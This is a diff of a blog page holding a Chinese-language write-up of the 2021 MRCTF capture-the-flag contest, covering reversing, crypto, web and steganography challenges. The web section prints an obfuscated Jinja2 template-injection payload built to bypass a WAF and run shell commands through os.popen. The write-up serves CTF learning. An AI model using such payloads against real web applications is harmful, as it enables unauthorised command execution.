@@ -336,19 +336,6 @@
 </header>
 
     
-<script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/cryptojs/crypto-js.min.js"></script>
-<script>
-    (function() {
-        let pwd = '';
-        if (pwd && pwd.length > 0) {
-            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
-                alert('密码错误，将返回主页！');
-                location.href = '/';
-            }
-        }
-    })();
-</script>
-
 
 
 
@@ -537,8 +524,9 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p><img src="/2021/04/15/CTF_2021MRCTF/image-20210414230156814.png"></p>
-<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><blockquote>
+                <p><img src="/2021/04/15/CTF_2021MRCTF/image-20210414230156814.png" alt=""></p>
+<h2 id="引言">引言</h2>
+<blockquote>
 <p><strong>2021 MRCTF</strong></p>
 <p><a target="_blank" rel="noopener" href="https://2021.mrctf.fun/">https://2021.mrctf.fun/</a></p>
 <p><strong>比赛时间</strong></p>
@@ -549,23 +537,28 @@
 <p>前几天看北邮 天璇Merak 战队整了个招新赛，喵喵也来随便玩玩好了！</p>
 <p>什么鬼招新赛嘛，怎么巨大多 check in 题目，然而喵喵并不能 check in……</p>
 <p>喵呜，题目还是比较顶的，喵喵确实也不会做什么，大哭。</p>
-<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="Real-CHECKIN"><a href="#Real-CHECKIN" class="headerlink" title="Real_CHECKIN"></a>Real_CHECKIN</h3><p>直接丢进 IDA 发现只有一个 entry，看来是加壳了。</p>
+<h2 id="RE">RE</h2>
+<h3 id="Real-CHECKIN">Real_CHECKIN</h3>
+<p>直接丢进 IDA 发现只有一个 entry，看来是加壳了。</p>
 <p>丢进 FUPX 里一看，果然加了 UPX 壳。</p>
-<p><img src="/2021/04/15/CTF_2021MRCTF/image-20210410221618087.png"></p>
+<p><img src="/2021/04/15/CTF_2021MRCTF/image-20210410221618087.png" alt=""></p>
 <p>脱一下壳，再扔进 IDA。</p>
-<p><img src="/2021/04/15/CTF_2021MRCTF/image-20210410221654708.png"></p>
+<p><img src="/2021/04/15/CTF_2021MRCTF/image-20210410221654708.png" alt=""></p>
 <p><code>tvjdvez7D0vSyZbnzv90mf9nuKnurL8YBZiXiseHFq==</code> 直接拿去 base64 解码发现是乱码。看来是魔改的 base64 了。</p>
-<p><img src="/2021/04/15/CTF_2021MRCTF/image-20210410224735510.png"></p>
+<p><img src="/2021/04/15/CTF_2021MRCTF/image-20210410224735510.png" alt=""></p>
 <p>发现编码表里 大小写反过来了……草！</p>
-<p><img src="/2021/04/15/CTF_2021MRCTF/image-20210410224700889.png"></p>
+<p><img src="/2021/04/15/CTF_2021MRCTF/image-20210410224700889.png" alt=""></p>
 <p>于是大小写反过来，改一下编码表，再拿去 base64 解码就能拿 flag 了。</p>
 <p><code>MRCTF{wElc0Me_t0_MRCTF_2o21!!!}</code></p>
 <blockquote>
 <p><strong>Extensive Reading:</strong></p>
 <p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/database/140773.html">爆破非默认Base64编码表</a></p>
 </blockquote>
-<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="friendly-sign-in"><a href="#friendly-sign-in" class="headerlink" title="friendly_sign-in"></a>friendly_sign-in</h3><blockquote>
-<p>ez sign-in, just come and get the flag!<br> nc node.mrctf.fun 10007</p>
+<h2 id="Crypto">Crypto</h2>
+<h3 id="friendly-sign-in">friendly_sign-in</h3>
+<blockquote>
+<p>ez sign-in, just come and get the flag!<br>
+nc node.mrctf.fun 10007</p>
 <p>Mirrors:</p>
 <ul>
 <li>host, port = ‘nairw.top’, 4800</li>
@@ -624,11 +617,11 @@ length <span class="token operator">=</span> <span class="token builtin">len</sp
 
 
 main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>其实这个思路很简单，只需要生成 </p>
+<p>其实这个思路很简单，只需要生成</p>
 <ul>
-<li>不重复 </li>
-<li>每个数都不为0 </li>
-<li>对应位置数字的乘积累加和为0 </li>
+<li>不重复</li>
+<li>每个数都不为0</li>
+<li>对应位置数字的乘积累加和为0</li>
 </ul>
 <p>这样的序列就可以了。</p>
 <p>那么怎么生成呢？</p>
@@ -746,7 +739,9 @@ context<span class="token punctuation">.</span>log_level <span class="token oper
 <pre class="line-numbers language-none"><code class="language-none">1001101010100100100001101010100010001100111101101100101010000000011001101111001010111110110001101101000001100110110001101101011010111110011000101101110010111110111000001110010001100000110001001101100001100110110110101111101<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>转换为 bytes</p>
 <p><code>MRCTF{e@3y_ch3ck_1n_pr0bl3m}</code></p>
-<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="wwwafed-app"><a href="#wwwafed-app" class="headerlink" title="wwwafed_app"></a>wwwafed_app</h3><blockquote>
+<h2 id="Web">Web</h2>
+<h3 id="wwwafed-app">wwwafed_app</h3>
+<blockquote>
 <p>I bought a WAF for my vulnerable app, and I think it’s unbreakable now.</p>
 <p>node.mrctf.fun:15000</p>
 </blockquote>
@@ -778,7 +773,7 @@ eGFkc2ZhZHNmYWRzZmFzLmRmYXNkZi1hc2RmLWFkc2ZhZHNmLmxhamRzLi05MjM0MTAxMmRzZmFzZjgu
 
 GET /api/spider/eGFkc2ZhZHNmYWRzZmFzLmRmYXNkZi1hc2RmLWFkc2ZhZHNmLmxhamRzLi05MjM0MTAxMmRzZmFzZjguNS5tcmN0Zi5mdW4Ke3sxNjEqMTY1MX19<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>返回</p>
-<p><img src="/2021/04/15/CTF_2021MRCTF/image-20210411200800302.png"></p>
+<p><img src="/2021/04/15/CTF_2021MRCTF/image-20210411200800302.png" alt=""></p>
 <p>读 <code>/</code></p>
 <pre class="line-numbers language-none"><code class="language-none">{{""["\x5f\x5fcla""ss\x5f\x5f"]["\x5f\x5fba""se\x5f\x5f"]["\x5f\x5fsubcla""sses\x5f\x5f"]()[408]["\x5f\x5fin""it\x5f\x5f"]["\x5f\x5fglo""bals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("ls -al /")["read"]()}}
 
@@ -857,38 +852,42 @@ app <span class="token operator">=</span> Flask<span class="token punctuation">(
 <p>讲个笑话，这题打的时候最开始还读到有 flag 的，然后发现内容是 <code>1</code>。</p>
 <p>再一读发现没东西了。再一看根目录，flag 你去哪了……</p>
 <p>问了问出题人</p>
-<p><img src="/2021/04/15/CTF_2021MRCTF/image-20210411213829805.png"></p>
+<p><img src="/2021/04/15/CTF_2021MRCTF/image-20210411213829805.png" alt=""></p>
 <p>噢对，root 权限 xswl！</p>
 </blockquote>
 <blockquote>
 <p><strong>Extensive Reading:</strong></p>
 <p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p>
 </blockquote>
-<h3 id="ez-larave1"><a href="#ez-larave1" class="headerlink" title="ez_larave1"></a>ez_larave1</h3><blockquote>
+<h3 id="ez-larave1">ez_larave1</h3>
+<blockquote>
 <p><a target="_blank" rel="noopener" href="http://node.mrctf.fun:10012/">http://node.mrctf.fun:10012/</a></p>
 <p><a target="_blank" rel="noopener" href="https://drive.buptmerak.cn/s/afGBmP8zjg47orG">https://drive.buptmerak.cn/s/afGBmP8zjg47orG</a></p>
 </blockquote>
 <p>根据修改时间，看一看最近修改的文件。</p>
-<p><img src="/2021/04/15/CTF_2021MRCTF/image-20210411024331176.png"></p>
+<p><img src="/2021/04/15/CTF_2021MRCTF/image-20210411024331176.png" alt=""></p>
 <p>Laravel 版本用的是 5.7.29，查了查发现有个 RCE。</p>
 <p>然后这里的 <code>PendingCommand.php</code> 把 <code>__destruct()</code> 里的 <code>run</code> 给注释掉了。</p>
 <p><img src="/2021/04/15/CTF_2021MRCTF/image-20210414231340203.png" alt="__destruct"></p>
 <p>之后再参考下面的几篇</p>
 <blockquote>
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5510">Laravel入坑之CVE-2019-9081复现分析</a></p>
-<p><a target="_blank" rel="noopener" href="http://zeroyu.xyz/2020/06/28/Laravel-5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2019-9081-2020%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E9%A2%98%E8%A7%A3/">Laravel 5.7反序列化漏洞(CVE-2019-9081+2020第五空间题解)</a>   </p>
+<p><a target="_blank" rel="noopener" href="http://zeroyu.xyz/2020/06/28/Laravel-5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2019-9081-2020%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E9%A2%98%E8%A7%A3/">Laravel 5.7反序列化漏洞(CVE-2019-9081+2020第五空间题解)</a></p>
 </blockquote>
 <p>找个能执行代码的地方，执行这个 <code>run</code> 就好。</p>
 <p><em>（后面再来复现，咕咕咕</em></p>
-<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="plane"><a href="#plane" class="headerlink" title="plane"></a>plane</h3><blockquote>
+<h2 id="Misc">Misc</h2>
+<h3 id="plane">plane</h3>
+<blockquote>
 <p>This plane cannot fly~~~</p>
-<h3 id="Hint"><a href="#Hint" class="headerlink" title="Hint:"></a>Hint:</h3><ul>
+<h3 id="Hint">Hint:</h3>
+<ul>
 <li>plane:721x-402y+9110z-1197483=0</li>
 </ul>
 </blockquote>
 <p>![(153, 15, 120),(51, 104, 132),(229, 38, 115)](CTF_2021MRCTF/(153, 15, 120),(51, 104, 132),(229, 38, 115).png)</p>
 <p>图片好花啊，看了一下发现在 blue plane 第7层存在奇怪的东西。</p>
-<p><img src="/2021/04/15/CTF_2021MRCTF/image-20210414233015328.png"></p>
+<p><img src="/2021/04/15/CTF_2021MRCTF/image-20210414233015328.png" alt=""></p>
 <p>然而提取出来啥也看不出。</p>
 <p>根据题目 hint，估计是要根据 721x-402y+9110z-1197483=0 这个空间平面来划分图像空间，一半是黑，一半是白。</p>
 <p><img src="/2021/04/15/CTF_2021MRCTF/image-20210414233411199.png" alt="721x-402y+9110z-1197483=0"></p>
@@ -922,7 +921,7 @@ im2 <span class="token operator">=</span> Image<span class="token punctuation">.
 <span class="token comment"># im2.show()</span>
 <span class="token comment"># im2.save('test1.png')</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>得到一张图片，和  blue plane 7 很类似。（就是模仿 blue plane 7 确定的黑白）</p>
-<p><img src="/2021/04/15/CTF_2021MRCTF/test1.png"></p>
+<p><img src="/2021/04/15/CTF_2021MRCTF/test1.png" alt=""></p>
 <p>放大来看是这样的。</p>
 <p><img src="/2021/04/15/CTF_2021MRCTF/image-20210418002111188.png" alt="放大效果"></p>
 <p>图片 <strong>纵向方向上</strong> 可以发现分了很多层，猜想是把二进制的 ASCII 编码到了黑白像素中了。</p>
@@ -954,7 +953,7 @@ im2 <span class="token operator">=</span> Image<span class="token punctuation">.
 <pre class="line-numbers language-none"><code class="language-none">Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSV01WbDNXa1JTVjAxV2JETlhhMUpUVmpBeFYySkVUbGhoTVVwVVZtcEJlRll5U2tWVWJHaG9UVlZ3VlZadGNFSmxSbGw1VTJ0V1ZXSkhhRzlVVmxaM1ZsWmFkR05GU214U2JHdzFWVEowVjFaWFNraGhSemxWVm14YU0xWnNXbUZrUjA1R1UyMTRVMkpIZHpGV1ZFb3dWakZhV0ZOcmFHaFNlbXhXVm0xNFlVMHhXbk5YYlVaclVqQTFSMVV5TVRSVk1rcElaSHBHVjFaRmIzZFdha1poVjBaT2NtRkhhRk5sYlhoWFZtMHhORmxWTUhoWGJrNVlZbFZhY1ZadGRHRk5SbFowWlVaT1ZXSlZjRWRaTUZaM1ZqSktWVkpZWkZwV1JWcHlWVEJhVDJOc2NFaGpSbEpUVmxoQ1dsWXhXbE5TTWxGNVVtdGthbEp0VWxsWmJGWmhZMnhXY1ZKdFJsUlNiR3cxVkZaU1UxWnJNWEpqUld4aFUwaENTRlpxU2tabFZsWlpXa1p3YkdFelFrbFhXSEJIVkRKU1YxWnVVbWhTYXpWeldXeG9iMWRHV25STlNHUnNVakJzTkZVeWRHdFhSMHBJVld4c1dtSkhhRlJXTUZwVFZqSkdSbFJzVG1sU2JrSmFWMnhXWVZReFdsaFRiRnBZVmtWd1YxbHJXa3RTUmxweFVWaG9hMVpzV2pGV01uaGhZVWRGZUdOR2JGaGhNVnBvVmtSS1QyTXlUa1phUjJoVFRXNW9WVlpHWTNoaU1rbDRWMWhvV0dKRk5WVlVWM1J6VGtaVmVXUkhkRmhTTUhCSlZsZDRjMWR0U2toaFJsSlhUVVp3VkZacVNrZFNiRkp6Vkcxc1UySnJTbUZXTW5oWFdWWlJlRmRzYUZSaVJuQlpWbXRXZDFZeGJISlhhM1JUVW14d2VGVldhRzloTVZwelYycEdWMDF1YUdoWlZXUkdaVWRPUjJKR2FHaE5WbkJ2Vm10U1MxUXlUWGxVYTFwaFVqSm9WRlJYTlc5V1ZscEhXVE5vYVUxcmJEUldNV2h2VjBkS1JrNVdWbFZXTTFKNlZHdGFWbVZYVWtoa1JtaFRUVWhDU2xac1pEUmpNV1IwVTJ0a1dHSlhhR0ZVVnpWdlYwWnJlRmRyWkZkV2EzQjZWa2R6TVZkR1NsWmpSV3hYWWxoQ1RGUnJXbEpsUm1SellVWlNhRTFzU25oV1Z6QjRUa2RHUjFaWVpHaFNWVFZWVlcxNGQyVkdWblJOVldSV1RXdHdWMWxyVW1GWFIwVjRZMGhLV2xaWFVrZGFWV1JQVTBVNVYxcEhhR2hOU0VKMlZtMTBVMU14VVhsVmEyUlVZbXR3YjFWcVNtOVdSbXhaWTBaa2JHSkhVbGxhVldNMVlWVXhXRlZyYUZkTmFsWlVWa2Q0YTFOR1ZuTlhiRlpYWWtoQ1NWWkdVa2RWTVZwMFVtdG9VRll5YUhCVmJHaERUbXhrVlZGdFJtcE5WMUl3VlRKMGExZEhTbGhoUjBaVlZucFdkbFl3V25KbFJtUnlXa1prVjJFelFqWldhMlI2VFZaWmQwMVdXbWxsYTFwWVdXeG9RMU14VWxkYVJWcHNVbTFTV2xkclZURldNVnB6WTBaV1dGWXpVbkpXVkVaelZqRldjMWRzYUdsV1ZuQlFWa1phWVdReVZrZFdXR3hyVWtWS1dGUldXbmRsVm10M1YyNWtXRkl3VmpSWk1GSlBWakpHY2xkcmVGZGhhM0JRVlRGa1MxSXhjRWRhUms1WFYwVktNbFp0TVRCVk1VMTRWVmhzVlZkSGVGWlpWRVozWWpGV2NWUnJUbGRTYlhoYVdUQmFhMWRHV25OalJteGFUVVpWTVZsV1ZYaGpiVXBGVld4a1RsWXlhREpXTVZwaFV6RkplRlJ1VG1GU2JGcFlXV3RhZDA1c1draGxSMFphVm0xU1IxUnNXbUZWUmxwMFlVWlNWVlpYYUVSVk1uaGhZekZ3UlZWdGNFNVdNVWwzVmxSS01HRXhaRWhUYkdob1VqQmFWbFp0ZUhkTk1XeFdWMjVrVTJKSVFraFdSM2hUVlRKRmVsRnFWbGRTTTJob1ZrUktSMVl4VG5WVmJFSlhVbFJXV1ZaR1l6RmlNV1JIWWtoR1ZHRXhjSE5WYlRGVFYyeGtjbFpVUmxkTlZuQjZXVEJhVjFkR1dYcFZia3BYVmtWYWVsWnFSbGRqTVdSellVZHNWMVp1UWxGV2ExcGhXVmRSZVZaclpGZFhSM2h5Vld0V1MxZEdVbGRYYm1Sc1ZtMTBNMVl5Tld0WFJrbDNWbXBTV2sxR1NsQldha3BIWTJ4a2NtVkdaR2hoTTBKUlZsUkdhMU14U1hoalJXUmhVbXMxV0ZZd1ZrdE5iRnAwVFZSQ1ZrMVZNVFJXVm1oelZsWmtTR1ZHV2xwV1JWb3pXV3BHVjJOV1VuSlViR1JUWWxob05WWnRNREZoTVZsNFYyNU9hbEpGU21oV2JHUk9UVlphV0dNemFGaFNiRm94V1RCYWExUnNXWGxoUkVwWFlXdEtjbFY2Umt0amF6VlhXa1phYVZKc2NGbFdSbEpMWWpGT1YxZHJhR3hTTUZwWVZGZDRTMU5XV2xoa1J6bG9UVlZzTlZsVmFFTldiVXBJWVVWT1lWSkZXbWhaZWtaM1VsWldkR05GTlZkTlZXd3pWbXhTUzAxSFJYaGFSV2hVWWtkb2IxVnFRbUZXYkZwMFpVaGtUazFYZUZkV01qVnJWVEpLU1ZGcmFGZFNNMmhVVmxSS1JtVnNSbkZXYkdSVFRUSm9iMVpyVWt0U01WbDRWRzVXVm1KRlNsaFZiRkpYVjFaYVIxbDZSbWxOVjFKSVdXdG9SMVpIUlhoalNFNVdZbFJHVkZZeWVHdGpiRnBWVW14a1RsWnVRalpYVkVKaFZqRmtSMWRZY0ZaaWEzQllWbXRXWVdWc1duRlNiR1JxVFZkU2VsbFZaSE5XTVZwMVVXeEdWMkV4Y0doWFZtUlNaVlphY2xwR1pGaFNNMmg1VmxkMFYxTXhaRWRWYkdSWVltMVNjMVp0TVRCTk1WbDVUbGQwV0ZKcmJETldiWEJUVjJzeFIxTnNRbGRoYTNCSVdUSjRhMk50VmtkYVJUVlhZbXRLU2xZeFVrcGxSazE0VTFob2FsSlhhSEJWYlRGdlZrWmFjMkZGVGxSTlZuQXdWRlpTUTFack1WWk5WRkpYWWtkb2RsWXdXbXRUUjBaSFlVWndhVmRIYUc5V2JURTBZekpOZUdORmFGQldiVkpVV1d0V2QxZHNXa2hsUjNCUFZteHNORll5TlU5aGJFcFlZVVpzVjJFeFZYaGFSM2h6VmpGYVdXRkhjR2xXV0VKSFZteGtOR0V4VW5OWFdHeG9Va1Z3V0ZsWGRFdGpiRlkyVW10MGFtRjZWbGhYYTFwcllWWktjMk5HYkZkU2JFcElWWHBCTVdNeFpISmhSM1JUVFVad1dWZFhlR0ZaVm1SWFYyeG9hMUo2Ykc5VVZsWjNUVVpzVmxkc1RsZFdiSEJaV1ZWV1UxWnJNWFZoUjJoYVpXdGFNMVZzV2xka1IwNUdUbFprVGxaWGQzcFdiWGhUVXpBeFNGSllhR0ZTVjJoVldXdGtiMkl4Vm5GUmJVWlhZa1p3TUZwVmFHdFVhekZZWlVaa1YwMXFWbkpXVkVwTFUxWkdjbHBHVms1V2JGVjRWMVphWVZNeFpGZFNiR3hoVW0xb2NGVnRlSGRpTVZweVZXdDBVMDFXYkRSV1Z6VkxWMGRLUjFOdVFsZGlSbkF6VmpGYVlWSXhiRFpTYld4T1ZqRktTVmRYZEc5U01WcElVbGhvYWxORk5WZFpiRkpIVmtaWmVXVkhkR3BpUm5CV1ZXMTRhMVJzV25WUmFscFlWa1ZLYUZacVJtdFNNV1JaWTBaYWFXRXpRbGxXYlhSWFdWZFdjMWR1UmxOaVIxSnhWRlprVTJWc2JGWmFTRTVYVFZad01WVlhlRWRXTWtWNFkwZG9XRlp0VWxOYVZscGhZMnh3UjFwR2FGTk5NbWcxVm14a01GWXhUWGhhUldSV1lrZFNXVmx0TVZOak1WcDBUVlJDVGsxV2JEVlViR1F3VjBaS2NtSkVUbGRpV0VKVVZqSnplRkl4VG5OUmJHUk9ZV3RhU0Zkc1dtRldNazV6WTBWb1UySkhVazlVVnpGdlUyeFplRlZyY0d4U2F6RTBWVEZvYjJGc1NsaGhTRUpXWWxSR2RsWnJXbUZqTWtaR1ZHeFNUbFp1UVhkV1JscFRVVEZhY2sxV1drNVdSa3BZV1d0a2IyUnNXWGRYYlhSVVVqQmFTRmxyV25kaFZtUklZVWM1VjJKVVJUQlpla3BQWXpKT1JtRkdRbGROTUVwVlYxZDBiMUV3TlVkWGJGWlVWMGRTVUZacVFuZFRWbFY1WkVjNVYySlZjRWxhVldSdlZqSktTRlZyT1ZWV2JIQjZWbXBHWVZkWFJraGpSMnhYVjBWS1NGWnRlR3RPUjBWNFZXNU9XRmRIZUc5VmExWjNWMFpTVjFkdVpHaFNiRmt5VlcxMGQySkdTbk5UYWtaWFVucEdTRlpVU2t0U01rNUhZa1pvVjAweFNtOVhhMUpDVFZkTmVGcElTbWhTTTJoVVZGVmFkMkZHV25STlNHaFdUVlUxV0ZZeU5WTmhNVW8yWWtjNVZWWnNXbnBVYkZwelZtMUdSbFJzWkdsV1dFSktWMVpXVjFReGJGZFRhMXBZWW10d1dGbFhkR0ZoUm5CR1ZsUldWMDFXY0hsVWJGcHJZVmRGZDFkWWNGZGlXR2h4V2tSQmVGWXhVbGxoUmxwWVVqSm9XbGRYTVhwTlZscFhZa2hLWVZKNmJGaFphMXAzWld4WmVVNVhkRlZoZWtaWVdUQm9jMVl3TVhGU2EyaGFWak5vYUZreU1VOVNWa1owVW14T1YwMVZXWHBXYlhoVFV6RktkRlp1VGxOaVIzaG9WVzB4YjJOR1ZuUmxTR1JwVFZkU1dGWlhkREJWTURGWFlrUlNWMUo2VmxoV2JHUkxWMGRHUms5V1ZsZGxhMW95Vm1wR1lXRXhXWGhXYmtwaFVqTlNUMWxVUm5kVFZscHhVMnBTVjAxV1ZqVlZNblJyWVd4T1JrNVdaRnBpUmtwSVZtdGFVMVl4WkhOWGJYaFhUVVJSZVZaWE1UUmlNVlY1VWxod1VtSlZXbGhXYlRGT1pVWnNjVkpzY0d4U2JWSjRWako0UzJGSFNrWmpSMmhZVm0xUmQxZFdXbk5XTWs1SFYyeG9hVkl4U25oV1JtUXdXVlpKZUZWWWFGaGlXRkp2VldwR1lXVnNXWGxqUjBaWFRVUkdXVlpXYUd0WFJscDBWV3hPWVZac2NHaFpNbmgzVWpGd1IyRkdUazVOYldjeFZtMTRhMDFHV1hoVVdHaGhVbGRTVjFsclpGTlhWbXgwVFZaT2FrMVdjREJhVldoUFZERmFkVkZzWkZwV1YxRjNWakJhU21ReVRrWmhSbkJPVW01Q01sWnFTbnBsUms1SFZtNVdXR0pIVWs5WlYzUmhVMFprYzFkdFJsZE5helY2V1RCV2IxVXlTa2hWYkdoVlZteGFNMVpYZUdGak1WWnlXa2RvVGxaVVJUQldWRVp2WWpKR2MxTnNhRlppVjJoWFdXeG9UbVZHV1hkWGJIQnJUVlp3ZVZwRlZURmhWa3AxVVZoa1YxSnNjRlJWVkVaaFkyc3hWMWRyTlZkU2EzQlpWbTB3ZUdJeVZuTlhiazVZWWxoU1ZWVnFSbUZUUmxsNVpVaGtWMDFWY0ZoWmFrNTNWMFpaZWxGcmFGZGhhM0JRVm1wR1YyUldUbk5XYld4VFRWVndWbFl4WkRSaU1rbDNUbFprV0dKc1NrOVZhMVpoWWpGU1YxZHVUazlTYkd3MVZHeFZOV0ZIU2taalJXUldUV3BHZGxacVNrdFRSbFp5VDFaV1YySklRbTlXYWtKclZHMVdkRkpyWkdoU2F6VndWVzB3TlU1R1dYaFZhMDVhVmpCV05GWlhOVTlYUm1SSVpVYzVWbUV4V2pOV01GcHpWMGRTUm1SSGNHbFNiR3Q1VmxjeE1FMUhSblJTYWxwWFlrZG9XVmxVUm5kaFJteFhWMnQwYWsxck5VaFphMXByVlRKS1JtTkZNVmhXTTBKSVZrUkdXbVZHY0VsVGJXaFRUVEpvVlZaR1ZtRmtNV1JYVjJ0a1lWSkdTbFZVVmxVeFYwWlplV1ZIT1doTlZXOHlXV3RqTlZaV1duTlhhazVWVmxad2VsWnRlR3RqTVZKeldrWmthVk5GU2xwV01WSkRZVEZKZUZkc1pGaGlhelZ4VldwS2IxbFdjRmhrUjBaT1RWWmFlbFl5ZUd0aE1VbDNUbFZrVldKR2NISldSM2hoVjBkUmVtTkdaR2xYUjJoVlZsaHdRbVZHVGtkVWJHeHBVbXMxYjFSWGVFdFdiR1JZVFZod1RsWnNjRmhaYTJoTFdWWktObUpHYUZwaE1YQXpXbGQ0V21WVk5WaGtSbFpvWld0YVdWZFVRbTlqTVZsM1RWaEdVMkV5YUdGV2FrNXZZVVpyZVUxVk9WTldhMW93VlcxNFQxWXdNVlpYV0hCWFlsaG9WRlY2Umt0a1JscDFWR3hPYVZJemFHOVdWekI0WWpKT1IxWnVVbXhUUjFKd1ZGWmtVMWRHV2xoa1JFSldUVVJHV0ZsclVsTldNVW8yVm14b1YySkhVa3hXTUdSSFVtczVWMVpzWkd4aE1XOTVWbTF3UjFsWFJYaFhXR2hYWW10d2FGVnFUbE5VTVd4VlVtNWtWRlpzY0hoVk1uQlRWakF4VjFacVZsWk5ibEp5V1ZkNFQxSnJOVmRhUm5CcFVtdHdTVlp0ZEdGVk1WbDRXa2hPV0dKWWFGaFVWVkpTWlZaYVdFMVVVbWhOVmtwNlZqSTFWMVZ0Um5OalJteFhZVEZhVEZsVldtRmpWa3AwWkVaT1RsWXhTWGhXYTJRMFZUSkdSazFZVW1oU2VteFlWbXBPVTFkR1pGZFhiazVYVFdzMVNGWXlNVWRWTVdSSFUyeGFWMkpVUmpaVVZtUlhZekpLUjFkdFJsTmxiWGhYVjFab2QxSXhXWGhoTTJSWVlsVmFXRlJYZEhkVFZscElZMFpPVjFZd1ZqVldWM2hQV1ZaYWMyTkhhRnBOYm1nelZXcEdkMUl5UmtkVWF6Vk9ZbGRqZUZadE1UUmhNbEY0VWxob2FWSnRhRlpaVkVwVFYwWnNkR1ZGZEdwTlZsWXpWMnRhVDJGck1WaGxTR3hYVFc1b2NsWkVSbUZrVmtaeldrWndWMVl4UmpOV2FrSmhVMjFSZVZScldtaFNia0pQVlcwMVEwMXNXbkZUYm5Cc1VtczFTVlZ0ZEdGaVJrcDBWVzA1V2xaRldqTlpha1poVjBVeFZWVnRhRTVoZWxWM1ZtMHhNR0V4YkZkVGJGWlhZa2RvWVZsc2FGTlVSbFY1WlVad2JGSnNXbmxaTUdRMFZUSkdObEpVUWxkV1JWcDJXV3BLUjJNeFRuTmhSbHBwVmpKb1dGZFhkR0ZUTVdSSFYydFdVMkpIVW5GVVYzUmhVakZhU0dWR1RsVmlSbkF4VlZab2ExWXhTbk5qUmxKV1ZrVmFhRmt5YzNoV01XUnlUbFprVTJFelFscFdNV1F3WVRKSmVWVnVUbGhYUjFKWldXeG9VMVpXVm5GUmJVWlVVbTE0VjFZeU5XdGhSbHAwVld0c1dsWlhUVEZXYWtwTFZsWktWVkZzY0d4aE0wSlFWMnhXYTFReFNuUlNhMlJTWWtkU2NGWnRkSGRXYkZsNFdrUkNWMDFzUmpSWGEyaFBWMGRGZVZWc2JGcGlSMmhFVmxWYVlXTldSblZhUmxKWFlrWlpNVmRyVm1wT1ZsbDVVMnhhYWxKWGVHaFdiR1JUWkd4YWNWTnJkRlJTYkZwNVZERmFWMVl5U2tsUmFscFhZbGhDU0ZkV1dtdFhSa3B5V2tkb1UyRjZWbmRXVnpCM1RsVTFSMWRZYUZaaE1EVmhWbXBDVjA1R1dsaE9WVGxZVW0xU1NWcFZZelZXYlVWNFYycE9WMDFHY0hwV01HUlRVbTFTU0dOSGJGTmlSM1ExVm14amQyVkZNVWRYV0dST1ZtMVNjVlZyVm1GV01WSllUbGM1VTFKc2NIaFZNblF3VmtaYWNsZHFSbGhoTVhCeVdWWmFhMUl4VG5OaVJtUnBWa1ZKTUZac1kzaFdNVWw0WTBWc1YySkZOWEJWYkdoRFpERmFkR1ZIUm10TmExcElWakkxVTFSc1drWlRia1pWVmxaS1dGWXdXbUZrUlRWWFZHMW9UbFpYT0hsWFYzUmhZVEZhZEZOc2JHaFRTRUpXV1d0YWQyVnNXblJOVldSVFlrWktlbGRyWkhOV01XUkdVMnQwVjAxV2NGaFdha1pTWlVkS1IxcEdVbWhOV0VKYVYxY3hNR1F4WkVkaVJtaHJVakJhYjFWdE5VTlNNVnB6Vld4a1YwMUVSbGhaTUdoelZsZEtSMk5JU2xwV2JWSkhXa1JHYTFkWFRrZGFSMnhZVWpKb05GWXlkRk5SYlZaSFYxaG9WbUpIZUc5VmJURnZZakZTV0UxWE9WZGlSMUpaV2tWa01HRlZNWEppUkZKWFlsUldTRlpYTVV0V2JHUnpZVVp3YUUxWVFYcFdSbFpoWkRGYWRGSnJhR3RTYkZwdldsZDBZVmRXWkZWUmJUbHFUVlpzTTFSV2FFZFZNa1Y1WVVkR1YyRnJOWFpaVlZweVpWZE9ObEpzYUZkTlNFSkpWMVpXYTJJeFVuTmFSVnBVWWtWd1dGUldXbmRoUm1SWFYyczFiRlpzU2pGV1YzaFhZVVV4VjJOR2NGaFdNMUp5VmxSS1NtVkdWbk5oUjNCc1lUQndVRlpYTUhoVk1XUnpZVE5rVjJKWVVsaFVWM1IzVjBaWmVXVkhPVmROVlc4eVZtMTRiMVl5UlhsVmEzaFdZV3RhVUZwR1drZGpNWEJJWWtaT2FXRXdXVEpXYlRGM1VqRnNWMkpHWkZSWFIyaHdWV3RhZDFaR2JITmFSRkpWVFZad2VGVnRkREJXU